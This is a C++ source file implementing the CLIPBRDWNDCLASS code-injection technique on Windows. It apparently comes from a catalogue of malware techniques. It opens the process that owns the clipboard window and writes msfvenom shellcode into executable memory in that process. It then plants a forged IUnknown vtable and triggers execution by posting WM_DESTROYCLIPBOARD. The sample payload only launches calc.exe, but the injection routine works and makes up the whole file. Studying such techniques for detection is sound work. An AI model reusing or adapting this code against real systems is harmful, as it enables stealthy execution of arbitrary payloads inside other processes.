/*
* Title: CLIPBRDWNDCLASS
* Resources:
*	- https://modexp.wordpress.com/2019/05/24/4066/
*	- https://unprotect.it/technique/clipbrdwndclass/
*/
#include <Windows.h>
#include <iostream>

typedef struct _IUnknown_t {
	// a pointer to virtual function table
	ULONG_PTR lpVtbl;
	// the virtual function table
	ULONG_PTR QueryInterface;
	ULONG_PTR AddRef;
	ULONG_PTR Release; // executed for WM_DESTROYCLIPBOARD
} IUnknown_t;

VOID Cleanup(HANDLE hProcess, LPVOID lpShellcodeAddr, LPVOID lpIUnknownAddr) {
	if (lpShellcodeAddr)
		VirtualFreeEx(hProcess, lpShellcodeAddr, 0, MEM_RELEASE);
	if (lpIUnknownAddr)
		VirtualFreeEx(hProcess, lpIUnknownAddr, 0, MEM_RELEASE);
	if (hProcess)
		CloseHandle(hProcess);
}

BOOL CLIPBRDWNDCLASS() {
	// The shellcode generated by `msfvenom -p windows/x64/exec CMD=calc.exe -f c`
	unsigned char shellcode[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
		"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
		"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
		"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
		"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

	HWND hWnd = FindWindowEx(HWND_MESSAGE, nullptr, L"CLIPBRDWNDCLASS", nullptr);
	if (!hWnd) return FALSE;
	DWORD dwPid = 0;
	if (!GetWindowThreadProcessId(hWnd, &dwPid))
		return FALSE;

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
	if (!hProcess)
		return FALSE;

	// Allocate memory and write shellcode.
	LPVOID lpShellcodeAddr = VirtualAllocEx(hProcess, nullptr, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!lpShellcodeAddr) {
		Cleanup(hProcess, lpShellcodeAddr, nullptr);
		return FALSE;
	}
	SIZE_T dwBytesWritten = 0;
	if (!WriteProcessMemory(hProcess, lpShellcodeAddr, shellcode, sizeof(shellcode), &dwBytesWritten)) {
		Cleanup(hProcess, lpShellcodeAddr, nullptr);
		return FALSE;
	}

	// Allocate memory and write IUnknown interface.
	LPVOID lpIUnknownAddr = VirtualAllocEx(hProcess, nullptr, sizeof(IUnknown_t), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (!lpIUnknownAddr) {
		Cleanup(hProcess, lpShellcodeAddr, lpIUnknownAddr);
		return FALSE;
	}
	IUnknown_t iu = {};
	iu.lpVtbl = (ULONG_PTR)lpIUnknownAddr + sizeof(ULONG_PTR);
	iu.Release = (ULONG_PTR)lpShellcodeAddr;
	if (!WriteProcessMemory(hProcess, lpIUnknownAddr, &iu, sizeof(IUnknown_t), &dwBytesWritten)) {
		Cleanup(hProcess, lpShellcodeAddr, lpIUnknownAddr);
		return FALSE;
	}

	// Set the interface property and trigger execution.
	SetProp(hWnd, L"ClipboardDataObjectInterface", lpIUnknownAddr);
	PostMessage(hWnd, WM_DESTROYCLIPBOARD, 0, 0);

	WaitForSingleObject(hProcess, INFINITE);

	Cleanup(hProcess, lpShellcodeAddr, lpIUnknownAddr);

	return TRUE;
}
